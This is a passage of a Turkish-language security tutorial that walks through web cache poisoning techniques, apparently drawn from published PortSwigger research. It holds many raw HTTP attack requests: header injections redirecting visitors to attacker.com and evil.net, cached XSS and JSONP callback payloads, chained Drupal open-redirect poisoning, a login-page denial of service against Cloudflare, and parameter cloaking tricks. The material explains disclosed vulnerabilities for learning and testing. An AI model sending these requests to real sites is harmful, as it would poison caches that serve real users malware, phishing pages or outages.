</code></pre></div></div>

```bash
HTTP/1.1 302 Found
Location: https://ghost.org/fail/ 
```

Cloudflare’ın blog’unun Ghost üzerinde barındırıldığını ve `X-Forwarded-Host` başlığının da Ghost üzerinde bir etkisi(fail yanıtı döndü) olduğunu aldığımız çıktıdan görebiliyoruz. Eğer hata yönlendirmesinden kaçınmak isterseniz [blog.binary.com](http://blog.binary.com) gibi bilinen bir blog adresini host olarak belirtebilirsiniz. Ancak tuhaf bir biçimde bu yalnızca 10 saniyelik gizemli bir gecikme ve ardından standaert [blog.cloudflare.com](http://blog.cloudflare.com) yanıtı ile sonuçlanır. 

Yeni bir kullanıcı Ghost üzerinde ilk kez blog kaydettirdiğinde, [ghost.io](http://ghost.io) altında benzersiz bir alt alan adı üretiliyor. Tabii bu kullanıcı dilerse bu mevcut blog için [blog.cloudflare.com](http://blog.cloudflare.com/) gibi isteğe bağlı bir özel alan adı tanımlayabilir. Bir kullanıcı özel bir alan adı tanımladıysa, [Ghost.io](http://ghost.io/) alt alanı basitçe bu alana yönlendirilecektir:

```bash
GET / HTTP/1.1
Host: alan-adi.ghost.io
```

```bash
HTTP/1.1 302 Found
Location: http://ozel-alan-adi.blog/
```

En önemlisi, aslında bu yönlendirme `X-Forwarded-Host` başlığı kullanılarak da tetiklenebilir:

```bash
GET / HTTP/1.1
Host: blog.cloudflare.com
X-Forwarded-Host: alan-adi.ghost.io
```

```bash
HTTP/1.1 302 Found
Location: http://ozel-alan-adi.blog/
```

Bu sayede aslında [ghost.org](http://ghost.org) üzerinde bir hesap oluşturup kendi özel alan adımı tanımlayacak olursam, [blog.cloudflare.com](http://blog.cloudflare.com) isteklerini `X-Forwarded-Host` başlığını kullanılarak kendi siteme yönlendirmem mümkün oluyor. Bu isteği önbelleğe kaydedecek olursam, tüm ziyaretçileri benim adresime yönlendirebilirim.

### Anahtarsız Girişlerin Zincirlenmesi

Bazı durumlarda, anahtar olarak kullanılmayan girdiler, uygulama yanıtı üzerinde küçük bir parçada bulunur. 

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en HTTP/1.1
Host: redacted.net
<span style="color:DodgerBlue">X-Forwarded-Host: xyz</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Set-Cookie: <span class="nv">locale</span><span class="o">=</span>en<span class="p">;</span> <span class="nv">domain</span><span class="o">=</span><span style="color:DodgerBlue">xyz</span>
</code></pre></div></div>

Gördüğünüz gibi `X-Forwarded-Host` başlığı, sunucunun çerezleri (`Set-Cookie`) belirli bir domaine (`xyz`) ayarlamasına neden oluyor. Ancak, yanıt içindeki URL'ler değiştirilmemiş. Tek başına bu bilgi, saldırı yapmak için yeterli değil.
Bu durumdan yararlanmak için diğer anahtar olarak kullanılmayan girişlerle bu anahtarsız girişi birleştirmemiz gerekebilir. 

```bash
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Scheme: nothttps
```

```bash
HTTP/1.1 301 Moved Permanently
Location: https://redacted.net/en
```

`X-Forwarded-Scheme: nothttps` başlığı, sunucunun yönlendirme yanıtı sunmasına sebep oluyor ancak hedef domain değişmiyor. Tek başına bu bilgi de saldırı yapmak için yeterli değil.
Ancak ikisini birleştirirsek, sunucu yanıtının `Location` başlığını değiştirebiliriz ve bu, saldırganın kontrol ettiği bir domain'e yönlendirme sağlar.

```bash
GET /en HTTP/1.1
Host: redacted.net
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: nothttps
```

```bash
HTTP/1.1 301 Moved Permanently
Location: https://attacker.com/en 
```

Bu tekniği kullanarak bir POST isteğini yeniden yönlendirerek CSRF tokenlerini düzenlenmiş olan HTTP başlığından çalmak mümkündür.(Tabii CORS müsade ediyorsa.) Ayrıca, daha önce bahsedilen [data.gov](http://data.gov/) üzerindeki zafiyete benzer şekilde, JSON olarak XSS yükü ekleyerek DOM based stored XSS'yi de elde etmek mümkündür.

### **Open Graph Hijacking**

Open graph protokolü, websitelerinin içeriklerinin sosyal medyada paylaşıldığında nasıl görüneceğinin belirlenmesini sağlar.

Örneğin anahtar olarak kullanılmayan `X-Forwarded-Host` başlığı Open Graph URL adresini değiştiriyor:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /en HTTP/1.1
Host: redacted.net
<span style="color:DodgerBlue">X-Forwarded-Host: attacker.com</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Cache-Control: max-age<span class="o">=</span>0, private, must-revalidate
…
&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:url"</span> <span class="nv">content</span><span class="o">=</span><span class="s1">'https://<span style="color:DodgerBlue">attacker.com</span>/en'</span>/&gt;
</code></pre></div></div>

Burada ele geçirdiğimiz **og:url** parametresi, paylaşılan URL'yi etkili bir şekilde geçersiz kılar, böylece bu sayfayı paylaşan herkes aslında bizim seçtiğimiz içeriği paylaşmış olur.

Yanıta dikkat edecek olursanız, web uygulaması `Cache-Control: private` ile Cloudflare’in önbelleğe almamasını sağlıyor. Fakat websitesindeki diğer bazı sayfalar önbelleğe alındığı için bu zafiyeti o sayfalar üzerinden gerçekleştirmek mümkün.

```bash
GET /popularPage HTTP/1.1
Host: redacted.net
X-Forwarded-Host: evil.com
```

```bash
HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
Set-Cookie: session_id=942…
CF-Cache-Status: MISS
```

Buradaki '`CF-Cache-Status`' başlığı, Cloudflare'in bu yanıtı önbelleğe almayı düşündüğünün bir göstergesi, ancak buna rağmen yanıt aslında hiçbir zaman önbelleğe alınmıyor. Araştırmacı, Cloudflare'in bunu önbelleğe almayı reddetmesinin **session_id** çereziyle ilgili olabileceğini tahmin edip bu çerez mevcutken yeniden denemiş:

```bash
GET /popularPage HTTP/1.1
Host: redacted.net
Cookie: session_id=942…;
X-Forwarded-Host: attacker.com
```

```bash
HTTP/1.1 200 OK
Cache-Control: public, max-age=14400
CF-Cache-Status: HIT
…
<meta property="og:url" 
content='https://attacker.com/…
```

Böylelikle yanıt önbelleğe alınmış oldu. Ayrıca araştırmacı, tahmin etmeye çalışmak yerine Cloudflare önbellek dokümantasyonlarının okunması gerektiğine de vurgu yapıyor.

Bu yanıt önbelleğe alınmış olmasına karşın, Facebook üzerindeki “share” özelliği, önbellekteki yanıtı dikkate almıyor. Hangi önbelleğin işe yarayacağını tanımlayabilmek üzere Cloudflare sitesinin debug özelliği olan /cdn-cgi/trace kullanılabilir.

![facebook-share]({{ site.url }}/blog/img/web-cache-poisoning/facebook-share.png){:class="responsive img-zoomable"}

Burada `colo=AMS` satırı Facebook'un [waf.party](http://waf.party/)'e Amsterdam'daki bir önbellek üzerinden eriştiğini gösteriyor. Hedef web sitesine Atlanta aracılığıyla erişildiği için, oradan ayda 2 ABD doları tutarında bir VPS kiralayıp ve zehirlenmeyi tekrar denemiş araştırmacı:

![vps-cache-test]({{ site.url }}/blog/img/web-cache-poisoning/vps-cache-test.png){:class="responsive img-zoomable"}


### Lokal Yönlendirme Zehirlemesi

James Kettle, araştırması sırasında php uygulamalarının yaygın olarak desteklediği `X-Original-URL` ve `X-Rewrite-URL` gibi http başlıkları keşfetmiş. Bunların WAF atlatmada kullanılabileceğini de bizzat deneyimlemiş.

```bash
GET /admin HTTP/1.1
Host: unity.com
```

```bash
HTTP/1.1 403 Forbidden
...
Access is denied
```

```bash
GET /anything HTTP/1.1
Host: unity.com
X-Original-URL: /admin
```

```bash
HTTP/1.1 200 OK
...
Please log in
```

Bir uygulama önbellek kullanıyorsa, bu başlıklar yanlış sayfaların sunulmasına neden olacak şekilde kötüye kullanılabilir. Örneğin, aşağıdaki isteğin /education?x=y önbellek anahtarı vardır ancak içeriği /gambling?x=y'den alır:

![local-redirect]({{ site.url }}/blog/img/web-cache-poisoning/local-redirect.png){:class="responsive img-zoomable"}

Sonuçta bu isteği gönderdikten sonra Unity for Education sayfasına erişmeye çalışan herkes bir sürprizle karşılaşıyor:

![unity-page]({{ site.url }}/blog/img/web-cache-poisoning/unity-page.png){:class="responsive img-zoomable"}

Tek başına sayfaların yerini değiştirmek risk teşkil etmese de yerine göre kritik güvenlik açıkları için bir adım olarak kullanılabilir.

### Dahili Önbellek Zehirlenmesi

Drupal genellikle Varnish gibi üçüncü taraf önbelleklerle kullanılır, ancak aynı zamanda varsayılan olarak etkin olan dahili bir önbellek mekanizması da içerir. Bu önbellek, `X-Original-URL` başlığının farkındadır ve onu önbellek anahtarına ekler, ancak bu başlıktaki sorgu dizesini de dahil etme hatasına düşer:


![local-cache]({{ site.url }}/blog/img/web-cache-poisoning/local-cache.png){:class="responsive img-zoomable"}

Önceki saldırı bir yolu başka bir yolla değiştirmemize izin verirken, bu saldırı sorgu dizesini geçersiz kılmamıza olanak tanıyor:

```bash
GET /search/node?keys=kittens HTTP/1.1
```

```bash
HTTP/1.1 200 OK
…
Search results for 'snuff'
```

Bu daha umut verici ama yine de oldukça sınırlı; üçüncü bir bileşene ihtiyacımız var.

### **Drupal Open Redirect**

Araştırmacı Drupal’ın URL-override kodunu okurken, “destination” sorgu parametresini kullanarak yönlendirme hedefini geçersiz kılabileceğini fark etmiş. Drupal harici bir alana yönlendirmeyi önlemek için URL ayrıştırması uygular fakat bunu atlamak da mümkündür:

```bash
GET //?destination=https://evil.net\@unity.com/ HTTP/1.1
Host: unity.com
```

```bash
HTTP/1.1 302 Found
Location: https://evil.net\@unity.com/
```

Drupal, path üzerinde çift eğik çizgiyi `//` normalleştirmek için `/`’ye dönüştürür, ancak ardından “**destination**” parametresi devreye girer. Drupal, hedef URL'nin '**evil.net**' kullanıcı adıyla **unity.com**'a işaret ettiğini düşünür.  Ancak pratikte web tarayıcıları `\`'yi otomatik olarak `/`'ye dönüştürerek kullanıcıları [evil.net/@unity.com](http://evil.net/@unity.com) adresine yönlendirir. Esasen Open redirect tek başına pek heyecan verici değildir, ancak artık ciddi bir zafiyet istismarı için gerekli tüm yapı taşlarına nihayet sahibiz.

### Kalıcı Yönlendirme Kaçakçılığı(Hijacking)

Parametrenin üzerine yazma açığı ile open redirect açığını birlikte kullanarak kalıcı yönlendirme kaçakçılığına sebep olmak mümkün.

Pinterest'in bussines web sitesindeki belirli sayfalar, yönlendirme yoluyla JavaScript'i içe aktarıyor. Aşağıdaki istek, mavi renkle gösterilen önbellek girdisini turuncu renkle gösterilen parametreyle zehirler:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET <span style="color:coral">/?destination<span class="o">=</span>https://evil.net<span class="se">\@</span>business.pinterest.com/</span> HTTP/1.1
Host: business.pinterest.com
X-Original-URL: <span style="color:DodgerBlue">/foo.js?v<span class="o">=</span>1</span>
</code></pre></div></div>

Bu, JavaScript içe aktarma işleminin hedefini ele geçiriyor ve [business.pinterest.com](http://business.pinterest.com/)'da statik olması gereken birkaç sayfa üzerinde tam kontrol imkanı sağlıyor:

```bash
GET /foo.js?v=1 HTTP/1.1
```

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
Location: https:/<span style="color:coral">/evil.net<span class="se">\@</span>unity.com/</span>
</code></pre></div></div>

### İç içe Önbellek Zehirlenmesi

Diğer Drupal siteleri genellikle yönlendirmeler yoluyla herhangi bir önemli kaynağı içe aktarmaz. Fakat site harici bir önbellek kullanıyorsa (hemen hemen tüm yüksek trafikli Drupal siteleri gibi), harici önbelleği zehirlemek için dahili önbelleği kullanabiliriz ve bu süreçte herhangi bir yanıtı yeniden yönlendirmeye dönüştürebiliriz. Bu iki aşamalı bir saldırıdır. İlk olarak, **/redir**'i kötü amaçlı yönlendirmemizle değiştirmek için dahili önbelleği zehirliyoruz:

```bash
GET /?destination=https://evil.net\@store.unity.com/ HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

Daha sonra, **/download?v=1**'i önceden zehirlenmiş **/redir**'imizle değiştirmek için harici önbelleği zehirliyoruz:

```bash
GET /download?v=1 HTTP/1.1
Host: store.unity.com
X-Original-URL: /redir
```

Sonuç olarak, unity.com'da 'setup indir'e tıklamak, evil.net'ten kötü amaçlı yazılımların indirilmesine neden olur. Bu teknik aynı zamanda RSS akışlarına sahte girişler eklemek, oturum açma sayfalarını kimlik avı sayfalarıyla değiştirmek ve dinamik script üzerinden stored XSS'i de içeren çok sayıda başka saldırı için de kullanılabilir. 

Bu zafiyet 2018-05-29 tarihinde Drupal, Symfony ve Zend ekiplerine bildirilip  [SA-CORE-2018-005](https://www.drupal.org/SA-CORE-2018-005), [CVE-2018-14773](https://symfony.com/blog/cve-2018-14773-remove-support-for-legacy-and-risky-http-headers), [ZF2018-01](https://framework.zend.com/security/advisory/ZF2018-01) referans numaraları tanımlanmıştır.

Olası yaklaşımlar konusunda gözümüzü açması açından güzel bir örnek.

Şimdiye kadar ele aldığımız pratik yaklaşımlara ek olarak aşağıdaki araştırmayı da kısaca dahil ederek devam edebilliriz

[https://portswigger.net/research/web-cache-entanglement](https://portswigger.net/research/web-cache-entanglement)

## Önbellek Testi

Önbellek mekanizmasının nasıl çalıştığını anlamak için önbellek mekanizmasının kullanıldığından emin olduğumuz bir nokta üzerinde testlerimizi gerçekleştirmemiz gerekiyor. 

Testler sırasında önbellek durumunu takip etmemizi sağlayacak **HIT MISS** gibi dönüşlerin yanı sıra yanıt süresi de önbellek işlemi hakkında bize ipucu veriyor olacak.

### Anahtarın Kullanımını Keşfetmek

Önbellek testi gerçekleştirebileceğimiz noktayı belirledikten sonra, bir dizi istek ile önbellek anahtarlarının kaydedilme esnasında girdiler üzerinde dönüşüm uygulanıp uygulanmadığını test etmemiz gerek. Genellikle belirli query parametreleri veya query dizesinin tamamı silinebiliyor veya `Host` başlıkları silinip URL ayrıştırma uygulanabiliyor. Yani önbellek anahtarı olarak kullanılan değerler de bir takım dönüşümler geçirdikten sonra nihai anahtar halini alıyorlar.

Test etmek için her sorguda bir başka küçük değişiklik yaparak yanıtları kontrol etmemiz gerek. Örnek olarak `Host` başlığını yanıtta yansıtan bir servisi ele alalım:

```bash
GET / HTTP/1.1
Host: redacted.com
```

```bash
HTTP/1.1 301 Moved Permanently
Location: https://redacted.com/en
CF-Cache-Status: MISS
```

Gördüğünüz gibi `Host` başlığındaki değer yanıtta bulunuyor. Denemek için port bilgisini değiştirip gönderelim:

```bash
GET / HTTP/1.1
Host: redacted.com:1337
```

```bash
HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1337/en
CF-Cache-Status: MISS
```

Şimdi port bilgisini silip tekrar orijinal isteği gönderelim:

```bash
GET / HTTP/1.1
Host: redacted.com
```

```bash
HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1337/en
CF-Cache-Status: HIT
```

Bu yanıt sayesinde port adresinin önbellek anahtarı olarak **kullanılmadığını** teyit etmiş olduk. Bu sayede ana sayfaya ulaşmak isteyen kullanıcılar önbellek dolayısıyla olmayan bir port adresine istek gönderecekleri için önbellekten yanıt dönülen kullanıcılar servise erişemeyecekler. 

<p class="mavi"><strong>ℹ️ Not:</strong> Buradaki örnekte, isteğin önbelleğe alınması için servisin hangi zaman veya koşulda önbellekleme yaptığı detayı göz ardı edilmiştir. Her isteğin her zaman önbelleğe alınmadığından daha önce bahsetmiştik. Burada örneği basit tutmak adına doğrudan sonuçlar gösteriliyor.</p>

Web cache açıklarını dikkate değer kılmak için web servisinin sunduğu çeşitli özelliklerle birlikte akıllıca tetiklenecek hale getirmemiz gerek. Anlatım sırasında bu duruma dair örnekleri ele alacağız. 

Örneğin XSS açıklarını stored formuna getirmemiz, dinamik olarak oluşturulan JS vs CSS kaynaklarını manipüle etmemiz ve standart tarayıcıların göndermeyeceği normalde “sömürülemez” kabul edilen açıklardan yararlanmamız mümkün olacak.

### Anahtar Olarak Kullanılmayan “Query” Tespiti

Çoğu önbellek anahtar mekanizması "query" yani sorgu dizesinin tamamını önbellek anahtarı olarak ele almaz.

Test etmek için bir parametrenin değerini değiştirerek ve yanıtlardaki bazı farklılıkları gözlemleyerek çoğu dinamik sayfayı kolayca tanıyabilirsiniz.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary</span> HTTP/1.1
Host: example.com
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
&lt;<span class="nb">link </span><span class="nv">rel</span><span class="o">=</span><span class="s2">"canonical"</span> <span class="nv">href</span><span class="o">=</span><span class="s2">"https://example.com/?q=<span style="color:DodgerBlue">canary</span>"</span>
</code></pre></div></div>

Ancak bu yaklaşım, query sorgu dizesi önbellek anahtarı için kullanılmıyorsa işe yaramaz. Bu durumda, fazladan bir önbellek bozucu parametresi eklemenin bile hiçbir etkisi olmayacaktır. Aşağıdakiler, query'nin önbellek anahtarı olarak kullanılmadığı duruma örnek:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary&amp;cachebuster<span class="o">=</span>1234</span> HTTP/1.1
Host: example.com
</code></pre></div></div>

```bash
HTTP/1.1 200 OK
CF-Cache-Status: HIT

<link rel="canonical" href="https://example.com/
```
Eğer query, önbellek üretimi için kullanılıyor olsaydı ***canary&cachebuster=1234*** dizesi yeni bir önbellek oluşturacaktı, ancak böyle olmadığını çıktıdan görebiliyoruz.

Sayfa, önbelleğe alma işleminin ne zaman gerçekleştiğini açıkça belirtmediği sürece, buradaki güvenlik açığını fark etmek özellikle otomatik tarama yapan araçlar ile zordur.

Bu noktada önbellek anahtarı olarak kullanılan diğer bileşenleri değiştirerek, yeniden önbelleğe almaya zorlayabiliriz.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /?q<span class="o">=</span><span style="color:DodgerBlue">canary&amp;cachebust<span class="o">=</span>nwf4ws</span> HTTP/1.1
Host: example.com
Accept-Encoding: <span class="nb">gzip</span>, deflate, <span style="color:DodgerBlue">nwf4ws</span>
Accept: <span class="k">*</span>/<span class="k">*</span>, <span style="color:DodgerBlue">text/nwf4ws</span>
Cookie: <span class="nv"><span style="color:DodgerBlue">nwf4ws</span><span class="o">=</span>1</span>
Origin: <span style="color:DodgerBlue">https://nwf4ws.example.com</span>
</code></pre></div></div>

Bu yaklaşım bazı sistemlerde harika çalışır; örneğin, Cloudflare çalıştıran siteler, varsayılan olarak `Origin`'i önbellek anahtarına ekler. Bu gibi önbellek anahtarı olarak kullanılan başlıklarda değişimler yaparak yeni ve benzersiz önbellek oluşumunu tetikleyebiliriz. Ancak bu yaklaşım mükemmel değildir; bazı siteler önbellek anahtarlarında bu başlıkların hiçbirini içermez ve diğer sitelerde önbellek bozucularımız bazı şeyleri bozabilir.

Buradaki amacımız önbellek mekanizmasını test ederken benzersiz bir önbellek yanıtı ile sistemi tanımamız. Bu sebeple önbellek mekanizmasını sıfırlamak için aslında `PURGE` ve `FASTLPURGE`(fastly üzerinde) HTTP metotları sayesinde  önbelleklerin sıfırlanmasını talep de edebiliriz. Bu sayede var olan önbelleklerden kurtulup yenilerini oluşturarak sistemi tanımaya devam edebiliriz.

Bir diğer yöntem size pek çok önbellek mekanizması anahtar olarak path yani URL yolunu kullandığı için backend sistemine göre yolun normalleştirildiği farklı karakterleri kullanabiliriz. Aşağıdaki örnekler dört farklı sistemde `/` yoluna işaret ediyor aslında:

```bash
Apache: //
Nginx: /%2F
PHP: /index.php/xyz
.NET: /(A(xyz))/
```

Örneğin apache üzerinde `/` yoluna işaret etmek üzere `//` kullandığımızda sunucu arka tarafta bunu normalize ederek `/` haline getirecek. Fakat aradaki önbellek sunucusu bunu `//` olarak ele alacağı için farklı bir önbellek anahtarı gibi görecek. 

### Anahtar Olarak Kullanılmayan Query’den Yararlanmak

Örneğin aşağıdaki istek, gazetedeki her sayfada XSS’e yol açan bir query yansıtması barındırıyor. XSS payload’ı query kısmına girdiğimizde yanıta eklendiği için zararlı kod yanıtta yer alıyor.

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET //?<span style="color:DodgerBlue"><span class="s2">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span> HTTP/1.1
Host: redacted-newspaper.net
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
&lt;meta <span class="nv">property</span><span class="o">=</span><span class="s2">"og:url"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"//redacted-newspaper.net//?x"</span><span style="color:DodgerBlue"><span class="o">&gt;</span>&lt;script&gt;alert<span class="o">(</span>1<span class="o">)</span>&lt;/script&gt;<span class="s2">"/&gt;</span>
</span></code></pre></div></div>

Burada query, önbellek anahtarı olarak kullanılmadığı için **//** adresine istek atan kullanıcılar XSS yüküne maruz kalacaklar. Buradaki ikinci `/` işareti aslında site üzerindeki herkesi XSS yüküne maruz bırakmamak için yani güvenli test için mevcut. `PURGE` ile önbelleği temizleyip `/` adresinin bu yük ile önbelleğe alınmasını sağlarsak herkes bu XSS yüküne maruz kalacaktır. 

### Yönlendirme ile DoS

Anahtar olarak kullanılmayan query olduğunda ama XSS yükü yanıtlara yansıtılmadığında DoS yöntemi olarak kullanımı mümkün olabilir. 

Cloudflare’in oturum açma sayfası [dash.cloudflare.com/login](http://dash.cloudflare.com/login) adresinde bulunuyor fakat pek çok bağlantı, kullanıcıları /login/ aracılığıyla yönlendiren [cloudflare.com/login](http://cloudflare.com/login) adresine işaret ediyor. Yani kullanıcılar [cloudflare.com/login](http://cloudflare.com/login)  üzerinden giriş yapıp yönlendiriliyorlar. Bu yönlendirmeyi kendi önbellek testimiz için kullanarak, query kısmının önbellek anahtarı olarak ele alınıp alınmadığını test edebiliriz:

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login?x<span class="o">=</span><span style="color:DodgerBlue">abc</span> HTTP/1.1
Host: www.cloudflare.com
<span style="color:DodgerBlue">Origin: https://dontpoisoneveryone/</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
Location: /login/?x<span class="o">=</span><span style="color:DodgerBlue">abc</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login HTTP/1.1
Host: www.cloudflare.com
<span style="color:DodgerBlue">Origin: https://dontpoisoneveryone/</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 301 Moved Permanently
Location: <span style="color:DodgerBlue">/login/?x<span class="o">=</span>abc</span>
</code></pre></div></div>

Gördüğünüz gibi `Origin` başlığı önbellek anahtarı olarak kullanılırken, query kısmı kullanılmadığı için `Origin` aynı kalmak koşulu ile doğrudan /login path’i üzerinde de aynı önbellek yanıtı döndürüldü. 

Bu durum tek başına DoS’a sebep olmayabilir, ancak doğru yaklaşım ile bu tip önbellek zehirlenmelerini DoS olarak kullanabiliriz. Örneğin query dizesini maksimum URI uzunluğuna kadar doldurmayı deneyebiliriz:

```bash
GET /login?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/
```

Daha sonra başka biri giriş sayfasını ziyaret etmeye çalıştığında doğal olarak uzun bir sorgu dizesi içeren bir yönlendirme alacaktır:

```bash
GET /login HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/
```

```bash
HTTP/1.1 301 Moved Permanently
Location: /login/?x=very-long-string...
```

Tarayıcıları bu yönlendirmeyi otomatik olarak takip ettiğinde, query den önce path yoluna eklenen ekstra `/` URI'yi bir bayt daha uzun hale getirir ve bunun sunucu tarafından engellenmesine neden olur:

```bash
GET /login/?x=very-long-string... HTTP/1.1
Host: www.cloudflare.com
Origin: https://dontpoisoneveryone/
```

```bash
HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: MISS
```

Yani tek bir istekle Cloudflare'in giriş sayfasına giden bu rotayı ısrarla kapatabiliriz. Buradaki `Origin: https://dontpoisoneveryone/` başlığını güvenli test için eklemiştik. Eğer bu başlığı kaldırıp bu isteği önbelleğe aldırırsak, [cloudflare.com/login](http://cloudflare.com/login) üzerinden giriş yapmaya çalışan herkesin oturumuna mani olabiliriz. 

**Ayrıca lütfen dikkat edin, bunların hepsi yönlendirme sayesindedir**; Cloudflare 414 gibi bir hata durum koduna sahip herhangi bir yanıtı önbelleğe almayı reddettiği için aşırı uzun URI'yi kendimiz göndererek bu saldırıyı yapamayız. Tam sınırdaki sayıda(aşırı uzundan 1 bayt kısa) karakter içermeli. Zaten yönlendirme sırasında path yoluna yeni bir `/` karakteri eklendiği için saldırı mümkün olur. 

Buradaki örnek üzerinden de gördüğümüz gibi; aktif olarak kullanılan ve sorgu parametrelerini yansıtan önbelleğe alınabilir bir yönlendirme bulursanız, hedef sayfa önbelleğe alınabilir olmasa veya aynı domain üzerinde olmasa bile, yönlendirme hedefine parametreler enjekte ederek DoS gibi zafiyetleri ortaya çıkabilirsiniz.

Araştırmacı bu durumu Cloudflare’a iletmiş ve query değerini yansıtan yönlendirme yanıtlarının önbelleğe alınmasını önleyerek çözüm sunmuşlar. Fakat araştırmacı URL encoding ile bu önlemi de atlatmış:

```bash
GET /login?x=%6cong-string… HTTP/1.1
Host: www.cloudflare.com
```

```bash
HTTP/1.1 301 Moved Permanently
Location: /login/?x=long-string…
CF-Cache-Status: HIT
```

Daha sonra bu yöntem de çözülmüş, ancak query değerini `Location` başlığına eklemeden önce başka dönüşüm işlemi yapan bir sunucu bulursanız bu çözümü de atlamanız mümkün olabilir.

## Önbellek Parametresi Gizleme

Eğer spesifik bir parametre önbellek anahtarı olarak kullanımdan hariç tutuluyorsa, kelime ayrıştırma yapıldığı için bu durumu manipüle ederek başka parametreleri de hariç tutmamız mümkün olabilir. Yani önbellek parametrelerini keyfi olarak gizlememiz mümkün olabilir.

Basit bir örnek ile başlamak için Varnish üzerinde “`_`” parametresi silmek üzere stackoverflow üzerinde sunulmuş regex örneğini ele alabiliriz. 

```bash
set req.http.hash_url = regsuball(
           req.http.hash_url,
           "\?_=[^&]+&",
           "?");
```

Bu regex’e aşağıdaki isteği gönderelim:

```bash
GET /search?q=help?!&search=1 HTTP/1.1
Host: example.com
```

Önbellek anahtarını değiştirmeden “**q**” parametresini aşağıdaki şekilde zehirleyebiliriz:

```bash
GET /search?q=help?_=payload&!&search=1 HTTP/1.1
Host: example.com
```

Regex, '**_**' parametresini kaldırmaya çalışırken, geride bir '**?**' bırakır. Bu nedenle, soru işareti içeren parametreleri zehirleyebiliriz. Yani aslında farklı parametreler içeren istekleri aynı önbellek anahtarı oluşturacak şekilde önbelleğe aldırmamız mümkündür. Bu sayede son derece sıradan gözüken istekler bile zararlı yükleri barındırıyor olabilir.

### Akamai

Akamai örneğinde, '**akamai-transform**' parametresinin önbellek anahtarına dahil edilmemesi nedeniyle parametre gizlemesi yapabiliyorsunuz. Bunun nasıl bir fayda sağladığını anlamak için detaylı bir inceleme yapalım.

```bash
GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com
```

```bash
HTTP/1.1 200 OK
X-True-Cache-Key: /L/redacted.akadns.net/en?x=1 vcd=1234 cid=__
```

Burada, `akamai-transform` parametresi önbellek anahtarına dahil edilmediği için yanıtın önbellek anahtarında görünmüyor.

Akamai'nin URL ayrıştırması sayesinde, '**akamai-transform**' parametresini gizleyerek aynı önbellek anahtarını kullanabilirsiniz. Bu, farklı parametreler içeren isteklerin aynı önbellek anahtarına sahip olmasına neden olur. Yani aşağıdaki iki bağlantı da aynı önbelleği tetikler:

```bash
GET /en?x=1&akamai-transform=payload-goes-here HTTP/1.1
Host: redacted.com
```
```bash
GET /en?x=1 HTTP/1.1
Host: redacted.com
```

Eğer bu durumda biz **akamai-transform=zaralı-kodlar** ile zararlı kodları yanıtta barındırabilirsek, zararsız bözüken url üzerinden de bu zararlı yanıtı içeren önbellek yanıtı döndülür.

### Ruby on Rails Örneği

Ruby on Rails örneğinde, '`;`' karakterinin parametre ayracı olarak kullanılması sayesinde parametre gizlemesi yapabiliyorsunuz.

Yani aslında her ikisi de aynı kabul ediliyor:

```bash
/?param1=test&param2=foo
/?param1=test;param2=foo
```

Aşağıdaki örnekte **utm_content** ifadesi önbellek anahtarı olarak kullanılmamak üzere ayrıştırılıyor. Ayrıştırma esnasında karmaşaya sebep olmak için aşağıdaki isteği gönderebiliriz.

```bash
GET /jsonp?callback=legit&utm_content=x;callback=alert(1)// HTTP/1.1
Host: example.com
```

```bash
HTTP/1.1 200 OK
alert(1)//(some-data)
```

Bu istekte, Ruby on Rails üç parametre görür: `callback`, `utm_content` ve `callback`. Rails, ikinci `callback` değerine öncelik verir ve saldırganın kontrolü altında olan değeri kullanır. Dolayısıyla artık normal şekilde `GET` ile bu standart link ziyaret edildiğinde önbellekten zararlı yükün bulunduğu yanıt getirilir.

```bash
GET /jsonp?callback=legit HTTP/1.1
Host: example.com
```

```bash
HTTP/1.1 200 OK
X-Cache: HIT
alert(1)//(some-data)
```

Bu istekte, `utm_content` parametresi önbellek anahtarına dahil edilmediği için yanıt aynı önbellek anahtarına sahip olur. İlk istekte kötü amaçlı `callback` değeri önbelleğe alındığı için, ikinci istek de aynı kötü amaçlı yanıtı döner.

#### Özet

Her iki örnekte de parametre gizlemesi, saldırganın kötü amaçlı yüklerini sunucuya gizlice gönderip bu yüklerin önbelleğe alınmasına ve daha sonra diğer kullanıcılar tarafından güvenli gözüken standart adresten erişilmesine olanak tanır.

### Anahtarsız Metod

